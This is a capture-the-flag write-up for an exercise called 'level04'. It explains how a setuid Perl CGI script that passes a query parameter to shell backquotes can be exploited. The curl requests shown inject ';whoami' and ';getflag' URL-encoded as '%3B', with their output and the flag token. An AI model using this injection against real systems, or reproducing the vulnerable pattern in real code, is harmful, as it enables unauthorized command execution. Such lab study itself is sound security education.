# level04

We have a perl script, with the set uid bit:

    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

Which mean that is we can inject the getflag command in the script, it will be executed with flag04 user rights.

    curl "http://localhost:4747/level04.pl?x=%3Bwhoami"
    flag04

This is a CGI script:

    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
      $y = $_[0];
      print `echo $y 2>&1`;
    }
    x(param("x"));

The only thing it does is retrieve user argument, but it prints it in a twisted way: the backquotes in perl mean that what's in between will be executed. Since there is suid bit, **instructions will be ran with flag04 rights**.

Then it is a classic injection: the user input starts with ";", and then we can input our getflag command. Let's not forget **url encoding: ``; = \%3B``.**

    curl "http://localhost:4747/level04.pl?x=%3Bgetflag"
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
